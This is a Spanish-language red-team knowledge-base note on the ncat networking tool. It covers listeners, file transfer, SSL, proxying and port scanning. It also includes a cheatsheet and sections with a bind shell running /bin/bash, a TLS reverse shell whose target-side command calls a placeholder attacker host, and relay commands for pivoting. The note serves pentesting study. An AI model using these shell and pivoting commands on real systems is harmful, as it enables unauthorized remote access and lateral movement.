---
aliases:
tags:
  - env/linux
  - asset/network
  - tool/ncat
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Post-Explotación]]"
tertiary categories:
  - "[[Shells]]"
kind: Tool
linked:
  - "[[nc]]"
  - "[[Reverse Shell]]"
---
# Herramienta `ncat`

## Definición 

> [!INFO] ncat
>Se utiliza para leer y escribir datos a través de conexiones de red utilizando los protocolos [[TCP]] o [[UDP]]. Es similar a [[nc|netcat]], pero con más características y opciones avanzadas.
^definicion

## Uso Básico

El uso básico de `ncat` es conectar dos computadoras para enviar y recibir datos. Aquí tienes algunos ejemplos básicos:

1. **Crear un servidor que escuche en un puerto específico:**
```bash
ncat -l 1234
```
Este comando crea un servidor que escucha en el puerto 1234. Puedes conectarte a este servidor desde otra computadora utilizando `ncat`.

2. **Conectar a un servidor:**
```bash
ncat 192.168.1.10 1234
```
Este comando se conecta al servidor en la dirección IP 192.168.1.10 en el puerto 1234.

## Características Avanzadas

1. **Transferencia de Archivos:**
Para enviar un archivo:
```bash
ncat --send-only --verbose -w 3 -i 1 -C < archivo.txt 192.168.1.10 1234
```
Para recibir un archivo:
```bash
ncat --recv-only --verbose -w 3 -i 1 -C > archivo.txt 192.168.1.10 1234
```

2. **Chat Simple:**
Para crear un servidor de chat:
```bash
ncat -lk 1234
```
Para conectarse al servidor de chat:
```bash
ncat 192.168.1.10 1234
```

3. **Proxy:**
Puedes usar `ncat` como un proxy para redirigir tráfico de un puerto a otro:
```bash
ncat -l 8080 --sh-exec "ncat example.com 80"
```
Esto redirige el tráfico del puerto 8080 a example.com en el puerto 80.

4. **Encriptación SSL:**
Para crear un servidor con SSL:
```bash
ncat --ssl -l 1234
```
Para conectarse a un servidor SSL:
```bash
ncat --ssl 192.168.1.10 1234
```

5. **Ejecutar Comandos Remotos:**
Puedes usar `ncat` para ejecutar comandos en una computadora remota:
En el servidor (para ejecutar comandos):
```bash
ncat -e /bin/bash -l 1234
```
En el cliente (para conectarse y ejecutar comandos):
```bash
ncat 192.168.1.10 1234
```

6. **Escaneo de Puertos:**
Aunque `nmap` es la herramienta principal para el escaneo de puertos, puedes usar `ncat` para un escaneo básico:
```bash
ncat -zv 192.168.1.10 80-90
```
Este comando escanea los puertos del 80 al 90 en la dirección IP 192.168.1.10.

## Opciones Comunes

- `-l` o `--listen`: Escuchar en un puerto específico.
- `-k` o `--keep-open`: Mantener el puerto abierto para múltiples conexiones.
- `-e` o `--exec`: Ejecutar un comando cuando se establece una conexión.
- `--ssl`: Usar SSL/TLS para encriptar la conexión.
- `--sh-exec`: Ejecutar un comando shell.
- `-z`: Modo de escaneo de puertos.
- `-v` o `--verbose`: Modo detallado.

## Ejemplos

1. **Crear un servidor HTTP simple:**
```bash
ncat -l 8080 --sh-exec "echo -e 'HTTP/1.1 200 OK\r\n\r\nHello, World!'"
```

2. **Transferir un archivo entre dos computadoras:**
Servidor (recibiendo el archivo):
```bash
ncat -l 1234 > archivo_recibido.txt
```
Cliente (enviando el archivo):
```bash
ncat 192.168.1.10 1234 < archivo_a_enviar.txt
```

## Ncat y SSL

#### Cómo utilizar SSL/TLS con Ncat

1. **Para iniciar un servidor SSL**:
   ```bash
   ncat --ssl --listen --ssl-cert <path_al_certificado> --ssl-key <path_a_la_llave> -p <puerto>
   ```
   - `--ssl`: Activa SSL.
   - `--listen`: Indica que Ncat debe actuar como servidor.
   - `--ssl-cert`: Especifica la ruta al certificado SSL.
   - `--ssl-key`: Especifica la ruta a la llave privada del certificado.
   - `-p`: Especifica el puerto en el que el servidor escuchará.

2. **Para conectar a un servidor SSL**:
   ```bash
   ncat --ssl <host> <puerto>
   ```
   - `--ssl`: Activa SSL.
   - `<host>`: Dirección IP o nombre del host del servidor.
   - `<puerto>`: Puerto del servidor al que deseas conectarte.

#### Ejemplo Práctico

1. **Generar un certificado y una llave (solo para pruebas, no en producción)**:
   ```bash
   openssl req -newkey rsa:2048 -nodes -keyout ncat-key.pem -x509 -days 365 -out ncat-cert.pem
   ```

2. **Iniciar el servidor Ncat con SSL**:
   ```bash
   ncat --ssl --listen --ssl-cert ncat-cert.pem --ssl-key ncat-key.pem -p 4444
   ```

3. **Conectar al servidor desde un cliente Ncat**:
   ```bash
   ncat --ssl localhost 4444
   ```

En este escenario, la conexión entre el cliente y el servidor estará cifrada utilizando SSL/TLS, protegiendo así la transmisión de datos contra interceptaciones y ataques.

### Resumen

`ncat` es una herramienta versátil y poderosa para la creación de conexiones de red, transferencia de archivos, ejecución de comandos remotos, y mucho más. Su flexibilidad lo hace útil para una amplia gama de tareas de red, desde la depuración hasta la automatización y el pentesting.


---

## Cheatsheet

| Comando | Qué obtenés | Cuándo |
|---|---|---|
| `ncat -lvnp 4444` | Listener TCP | Estándar |
| `ncat --ssl -lvnp 4444` | Listener con TLS | Shell sobre TLS |
| `ncat --ssl <target> <port>` | Conectar TLS | Servicio SSL/STARTTLS |
| `ncat -lvnp 4444 -e /bin/bash` | Bind shell | Bypass de filtros que bloquean conn out |
| `ncat -lvnp 4444 --allow <ip>` | Listener con whitelist | Limitar exposure |
| `ncat --proxy <ip>:<port> --proxy-type http <target> <port>` | Conectar via HTTP proxy | Pivoting |
| `ncat --broker -lvnp 4444` | Broker mode | Chat multi-client / relay |
| `ncat -u -lvnp 4444` | UDP listener | UDP exfil/recv |

---

## TLS reverse shell

```bash
# Attacker
openssl req -new -x509 -keyout key.pem -out cert.pem -days 365 -nodes
ncat --ssl -lvnp 4444 --ssl-cert cert.pem --ssl-key key.pem

# Target
ncat --ssl <attacker> 4444 -e /bin/bash
```

---

## Relay / pivoting

```bash
# Forward localhost:8080 → remote target:80
ncat -lvnp 8080 -c "ncat <target> 80"
```

---

## Notas Relacionadas

- [[nc]]
- [[Reverse Shell]]
- [[Pivoting & Port Forwarding]]
